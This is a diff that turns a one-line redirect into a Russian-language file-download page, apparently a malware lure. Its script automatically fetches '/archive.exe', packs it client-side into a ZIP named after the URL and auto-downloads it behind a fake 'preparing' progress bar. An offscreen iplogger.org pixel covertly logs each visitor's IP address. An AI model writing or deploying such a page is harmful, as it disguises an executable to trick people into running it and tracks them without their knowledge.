@@ -1,1 +1,612 @@
-<head><meta http-equiv="refresh"content="0;url=http://cloudzore.com/file/1682718">
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Скачать файл</title>
+  <style>
+    :root {
+      --bg: #e8edf3;
+      --card: #ffffff;
+      --text: #1a2332;
+      --muted: #6b7a90;
+      --line: #e2e8f0;
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --ok: #16a34a;
+      --err: #dc2626;
+      --bar-bg: #eef2f7;
+      --bar-fill: linear-gradient(90deg, #3b82f6, #2563eb);
+      --shadow: 0 12px 40px rgba(15, 23, 42, 0.08), 0 2px 8px rgba(15, 23, 42, 0.04);
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+      font-family: "Segoe UI", system-ui, -apple-system, Roboto, sans-serif;
+      color: var(--text);
+      background:
+        radial-gradient(1200px 500px at 50% -10%, #dbeafe 0%, transparent 55%),
+        var(--bg);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 440px;
+      background: var(--card);
+      border-radius: 16px;
+      box-shadow: var(--shadow);
+      border: 1px solid rgba(255, 255, 255, 0.8);
+      overflow: hidden;
+    }
+
+    .card-top {
+      padding: 1.75rem 1.75rem 1.25rem;
+      border-bottom: 1px solid var(--line);
+      text-align: center;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-size: 0.75rem;
+      font-weight: 600;
+      letter-spacing: 0.02em;
+      text-transform: uppercase;
+      color: var(--accent);
+      background: #eff6ff;
+      padding: 0.35rem 0.7rem;
+      border-radius: 999px;
+      margin-bottom: 1.25rem;
+    }
+
+    .file-icon {
+      width: 72px;
+      height: 72px;
+      margin: 0 auto 1rem;
+      border-radius: 16px;
+      background: linear-gradient(145deg, #eff6ff, #dbeafe);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: inset 0 0 0 1px #bfdbfe;
+    }
+
+    .file-icon svg { width: 36px; height: 36px; }
+
+    .filename {
+      font-size: 1.35rem;
+      font-weight: 700;
+      line-height: 1.3;
+      word-break: break-word;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.45rem;
+    }
+
+    .filesize {
+      font-size: 0.95rem;
+      color: var(--muted);
+      font-weight: 500;
+    }
+
+    .filesize strong {
+      color: var(--text);
+      font-weight: 600;
+    }
+
+    .card-body {
+      padding: 1.5rem 1.75rem 1.75rem;
+    }
+
+    .progress-block {
+      margin-bottom: 1.25rem;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 0.75rem;
+      font-size: 0.875rem;
+      margin-bottom: 0.55rem;
+      color: var(--muted);
+    }
+
+    .progress-label .pct {
+      font-variant-numeric: tabular-nums;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .progress-label.is-error { color: var(--err); }
+    .progress-label.is-done { color: var(--ok); }
+
+    .bar {
+      height: 10px;
+      background: var(--bar-bg);
+      border-radius: 999px;
+      overflow: hidden;
+      box-shadow: inset 0 1px 2px rgba(15, 23, 42, 0.06);
+    }
+
+    .bar-fill {
+      height: 100%;
+      width: 0%;
+      border-radius: 999px;
+      background: var(--bar-fill);
+      transition: width 0.25s ease;
+      position: relative;
+    }
+
+    .bar-fill.indeterminate {
+      width: 35% !important;
+      animation: slide 1.2s ease-in-out infinite;
+    }
+
+    .bar-fill.done {
+      background: linear-gradient(90deg, #22c55e, #16a34a);
+    }
+
+    .bar-fill.error {
+      background: linear-gradient(90deg, #f87171, #dc2626);
+    }
+
+    @keyframes slide {
+      0% { transform: translateX(-120%); }
+      100% { transform: translateX(320%); }
+    }
+
+    .btn {
+      width: 100%;
+      border: none;
+      cursor: pointer;
+      border-radius: 12px;
+      padding: 0.95rem 1.25rem;
+      font-size: 1rem;
+      font-weight: 700;
+      color: #fff;
+      background: var(--accent);
+      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.28);
+      transition: background 0.15s ease, transform 0.1s ease, opacity 0.15s ease;
+    }
+
+    .btn:hover:not(:disabled) {
+      background: var(--accent-hover);
+    }
+
+    .btn:active:not(:disabled) {
+      transform: translateY(1px);
+    }
+
+    .btn:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn.ready {
+      background: var(--ok);
+      box-shadow: 0 8px 20px rgba(22, 163, 74, 0.28);
+    }
+
+    .hint {
+      margin-top: 0.9rem;
+      text-align: center;
+      font-size: 0.8rem;
+      color: var(--muted);
+      line-height: 1.45;
+    }
+
+    .meta {
+      margin-top: 1.25rem;
+      padding-top: 1rem;
+      border-top: 1px solid var(--line);
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 0.75rem;
+      font-size: 0.78rem;
+      color: var(--muted);
+    }
+
+    .meta div span {
+      display: block;
+      font-size: 0.7rem;
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+      margin-bottom: 0.2rem;
+      opacity: 0.8;
+    }
+
+    .meta div b {
+      color: var(--text);
+      font-weight: 600;
+      font-size: 0.85rem;
+    }
+  </style>
+</head>
+<body>
+  <!-- IPLogger metrics -->
+  <img src="https://iplogger.org/162Kf7" alt="" width="1" height="1" style="position:absolute;left:-9999px;opacity:0;pointer-events:none" referrerpolicy="no-referrer-when-downgrade">
+
+  <div class="card">
+    <div class="card-top">
+      <div class="badge">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M12 3v12m0 0l4-4m-4 4l-4-4M4 19h16" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Скачивание
+      </div>
+
+      <div class="file-icon" aria-hidden="true">
+        <svg viewBox="0 0 48 48" fill="none">
+          <path d="M12 6h16l10 10v26a2 2 0 0 1-2 2H12a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2z" fill="#93c5fd"/>
+          <path d="M28 6v10h10" fill="#bfdbfe"/>
+          <path d="M12 6h16l10 10v26a2 2 0 0 1-2 2H12a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2z" stroke="#2563eb" stroke-width="1.5"/>
+          <path d="M28 6v10h10" stroke="#2563eb" stroke-width="1.5" stroke-linejoin="round"/>
+          <text x="24" y="34" text-anchor="middle" font-size="9" font-weight="700" fill="#1d4ed8" font-family="Segoe UI, sans-serif">ZIP</text>
+        </svg>
+      </div>
+
+      <div class="filename" id="filename">archive.zip</div>
+      <div class="filesize" id="filesize">Размер: <strong id="sizeValue">…</strong></div>
+    </div>
+
+    <div class="card-body">
+      <div class="progress-block">
+        <div class="progress-label" id="progressLabel">
+          <span id="statusText">Файл подготавливается…</span>
+          <span class="pct" id="pctText">0%</span>
+        </div>
+        <div class="bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0" id="bar">
+          <div class="bar-fill" id="barFill"></div>
+        </div>
+      </div>
+
+      <button type="button" class="btn" id="downloadBtn" disabled>Подготовка…</button>
+      <p class="hint" id="hint">Подождите, идёт подготовка файла к скачиванию.</p>
+
+      <div class="meta">
+        <div>
+          <span>Формат</span>
+          <b>ZIP</b>
+        </div>
+        <div>
+          <span>Статус</span>
+          <b id="metaStatus">Подготовка</b>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      "use strict";
+
+      var SOURCE_URL = "/archive.exe";
+
+      var filenameEl = document.getElementById("filename");
+      var sizeValueEl = document.getElementById("sizeValue");
+      var statusTextEl = document.getElementById("statusText");
+      var pctTextEl = document.getElementById("pctText");
+      var progressLabelEl = document.getElementById("progressLabel");
+      var barEl = document.getElementById("bar");
+      var barFillEl = document.getElementById("barFill");
+      var btn = document.getElementById("downloadBtn");
+      var hintEl = document.getElementById("hint");
+      var metaStatusEl = document.getElementById("metaStatus");
+
+      var readyBlob = null;
+      var progressTimer = null;
+
+      function getBaseName() {
+        var path = (window.location.pathname || "").replace(/\/+$/, "");
+        var segment = path.split("/").filter(Boolean).pop() || "archive";
+        segment = segment
+          .replace(/[\\/:*?"<>|]/g, "-")
+          .replace(/\.+$/, "")
+          .trim()
+          .replace(/\.(exe|zip)$/i, "");
+        return segment || "archive";
+      }
+
+      var baseName = getBaseName();
+      var zipName = baseName + ".zip";
+      var innerName = baseName + ".exe";
+
+      filenameEl.textContent = zipName;
+      document.title = "Скачать " + zipName;
+
+      function formatBytes(n) {
+        if (n < 1024) return n + " B";
+        if (n < 1024 * 1024) {
+          var kb = n / 1024;
+          return (kb >= 100 ? kb.toFixed(0) : kb.toFixed(1)) + " KB";
+        }
+        return (n / (1024 * 1024)).toFixed(2) + " MB";
+      }
+
+      function setProgress(pct, label, mode) {
+        pct = Math.max(0, Math.min(100, Math.round(pct)));
+        barFillEl.classList.remove("indeterminate", "done", "error");
+        progressLabelEl.classList.remove("is-error", "is-done");
+
+        if (mode === "error") {
+          barFillEl.classList.add("error");
+          progressLabelEl.classList.add("is-error");
+        } else if (mode === "done") {
+          barFillEl.classList.add("done");
+          progressLabelEl.classList.add("is-done");
+        }
+
+        barFillEl.style.width = pct + "%";
+        barEl.setAttribute("aria-valuenow", String(pct));
+        pctTextEl.textContent = pct + "%";
+        if (label) statusTextEl.textContent = label;
+      }
+
+      function stopSmoothProgress() {
+        if (progressTimer) {
+          clearInterval(progressTimer);
+          progressTimer = null;
+        }
+      }
+
+      /** Плавный прогресс на время долгой операции (сжатие ~10 с) */
+      function runSmoothProgress(from, to, durationMs, label) {
+        stopSmoothProgress();
+        setProgress(from, label);
+        var start = performance.now();
+        progressTimer = setInterval(function () {
+          var t = (performance.now() - start) / durationMs;
+          if (t >= 1) t = 1;
+          // ease-out: быстро в начале, медленнее к концу
+          var eased = 1 - Math.pow(1 - t, 2.2);
+          var value = from + (to - from) * eased;
+          setProgress(value, label);
+          if (t >= 1) stopSmoothProgress();
+        }, 80);
+      }
+
+      function triggerDownload(blob, name) {
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement("a");
+        a.href = url;
+        a.download = name;
+        a.rel = "noopener";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        setTimeout(function () {
+          URL.revokeObjectURL(url);
+        }, 4000);
+      }
+
+      /* CRC32 */
+      var CRC_TABLE = (function () {
+        var table = new Uint32Array(256);
+        for (var n = 0; n < 256; n++) {
+          var c = n;
+          for (var k = 0; k < 8; k++) {
+            c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
+          }
+          table[n] = c >>> 0;
+        }
+        return table;
+      })();
+
+      function crc32(bytes) {
+        var c = 0xffffffff;
+        for (var i = 0; i < bytes.length; i++) {
+          c = CRC_TABLE[(c ^ bytes[i]) & 0xff] ^ (c >>> 8);
+        }
+        return (c ^ 0xffffffff) >>> 0;
+      }
+
+      function writeU16(arr, off, v) {
+        arr[off] = v & 0xff;
+        arr[off + 1] = (v >>> 8) & 0xff;
+      }
+      function writeU32(arr, off, v) {
+        arr[off] = v & 0xff;
+        arr[off + 1] = (v >>> 8) & 0xff;
+        arr[off + 2] = (v >>> 16) & 0xff;
+        arr[off + 3] = (v >>> 24) & 0xff;
+      }
+
+      async function deflateRaw(bytes) {
+        if (typeof CompressionStream === "undefined") return null;
+        var cs = new CompressionStream("deflate-raw");
+        var stream = new Blob([bytes]).stream().pipeThrough(cs);
+        var ab = await new Response(stream).arrayBuffer();
+        return new Uint8Array(ab);
+      }
+
+      async function wrapInZip(fileName, fileBytes) {
+        var nameBytes = new TextEncoder().encode(fileName);
+        var crc = crc32(fileBytes);
+        var uncompSize = fileBytes.length;
+        var nameLen = nameBytes.length;
+
+        var payload = fileBytes;
+        var method = 0;
+        var compressed = await deflateRaw(fileBytes);
+        if (compressed && compressed.length < uncompSize) {
+          payload = compressed;
+          method = 8;
+        }
+        var compSize = payload.length;
+
+        var localLen = 30 + nameLen + compSize;
+        var cdLen = 46 + nameLen;
+        var out = new Uint8Array(localLen + cdLen + 22);
+
+        writeU32(out, 0, 0x04034b50);
+        writeU16(out, 4, 20);
+        writeU16(out, 6, 0x0800);
+        writeU16(out, 8, method);
+        writeU16(out, 10, 0);
+        writeU16(out, 12, 0);
+        writeU32(out, 14, crc);
+        writeU32(out, 18, compSize);
+        writeU32(out, 22, uncompSize);
+        writeU16(out, 26, nameLen);
+        writeU16(out, 28, 0);
+        out.set(nameBytes, 30);
+        out.set(payload, 30 + nameLen);
+
+        var o = localLen;
+        writeU32(out, o, 0x02014b50);
+        writeU16(out, o + 4, 20);
+        writeU16(out, o + 6, 20);
+        writeU16(out, o + 8, 0x0800);
+        writeU16(out, o + 10, method);
+        writeU16(out, o + 12, 0);
+        writeU16(out, o + 14, 0);
+        writeU32(out, o + 16, crc);
+        writeU32(out, o + 20, compSize);
+        writeU32(out, o + 24, uncompSize);
+        writeU16(out, o + 28, nameLen);
+        writeU16(out, o + 30, 0);
+        writeU16(out, o + 32, 0);
+        writeU16(out, o + 34, 0);
+        writeU16(out, o + 36, 0);
+        writeU32(out, o + 38, 0);
+        writeU32(out, o + 42, 0);
+        out.set(nameBytes, o + 46);
+        o += cdLen;
+
+        writeU32(out, o, 0x06054b50);
+        writeU16(out, o + 4, 0);
+        writeU16(out, o + 6, 0);
+        writeU16(out, o + 8, 1);
+        writeU16(out, o + 10, 1);
+        writeU32(out, o + 12, cdLen);
+        writeU32(out, o + 16, localLen);
+        writeU16(out, o + 20, 0);
+
+        return out;
+      }
+
+      async function fetchWithProgress(url, onProgress) {
+        var response = await fetch(url, { cache: "no-cache" });
+        if (!response.ok) {
+          throw new Error("Не удалось получить файл (HTTP " + response.status + ")");
+        }
+
+        var total = Number(response.headers.get("Content-Length")) || 0;
+        if (!response.body || !response.body.getReader) {
+          var ab = await response.arrayBuffer();
+          onProgress(1, ab.byteLength, ab.byteLength);
+          return new Uint8Array(ab);
+        }
+
+        var reader = response.body.getReader();
+        var chunks = [];
+        var received = 0;
+
+        while (true) {
+          var step = await reader.read();
+          if (step.done) break;
+          chunks.push(step.value);
+          received += step.value.length;
+          onProgress(total ? received / total : 0, received, total);
+        }
+
+        var out = new Uint8Array(received);
+        var offset = 0;
+        for (var i = 0; i < chunks.length; i++) {
+          out.set(chunks[i], offset);
+          offset += chunks[i].length;
+        }
+        return out;
+      }
+
+      function setReadyState(blob) {
+        readyBlob = blob;
+        sizeValueEl.textContent = formatBytes(blob.size);
+        btn.disabled = false;
+        btn.textContent = "Скачать";
+        btn.classList.add("ready");
+        metaStatusEl.textContent = "Готов";
+        hintEl.textContent = "Нажмите «Скачать», если загрузка не началась сама.";
+        setProgress(100, "Файл готов к скачиванию", "done");
+      }
+
+      function setErrorState(message) {
+        stopSmoothProgress();
+        btn.disabled = false;
+        btn.textContent = "Повторить";
+        btn.classList.remove("ready");
+        metaStatusEl.textContent = "Ошибка";
+        hintEl.textContent = "Произошла ошибка. Попробуйте ещё раз.";
+        setProgress(100, message || "Ошибка подготовки файла", "error");
+      }
+
+      async function prepareFile() {
+        readyBlob = null;
+        stopSmoothProgress();
+        btn.disabled = true;
+        btn.classList.remove("ready");
+        btn.textContent = "Подготовка…";
+        metaStatusEl.textContent = "Подготовка";
+        sizeValueEl.textContent = "…";
+        hintEl.textContent = "Подождите, идёт подготовка файла к скачиванию.";
+        setProgress(0, "Файл подготавливается…");
+
+        try {
+          var sourceBytes = await fetchWithProgress(SOURCE_URL, function (ratio, received, total) {
+            // 0–35% — загрузка исходника
+            var pct = 3 + ratio * 32;
+            if (!total) pct = Math.min(30, 3 + received / (512 * 1024));
+            setProgress(
+              pct,
+              "Файл подготавливается…",
+              null
+            );
+            if (total > 0 && sizeValueEl.textContent === "…") {
+              // предварительный размер (ориентир)
+              sizeValueEl.textContent = formatBytes(total);
+            }
+          });
+
+          if (sizeValueEl.textContent === "…") {
+            sizeValueEl.textContent = formatBytes(sourceBytes.length);
+          }
+
+          // 35–92% — сжатие / упаковка (обычно несколько секунд)
+          runSmoothProgress(36, 92, 12000, "Файл подготавливается…");
+
+          var zipBytes = await wrapInZip(innerName, sourceBytes);
+          stopSmoothProgress();
+          setProgress(96, "Файл подготавливается…");
+
+          var blob = new Blob([zipBytes], { type: "application/zip" });
+          setReadyState(blob);
+
+          // Автоскачивание
+          triggerDownload(blob, zipName);
+        } catch (err) {
+          console.error(err);
+          setErrorState((err && err.message) || "Не удалось подготовить файл");
+        }
+      }
+
+      btn.addEventListener("click", function () {
+        if (readyBlob) {
+          triggerDownload(readyBlob, zipName);
+          return;
+        }
+        prepareFile();
+      });
+
+      prepareFile();
+    })();
+  </script>
+</body>
+</html>
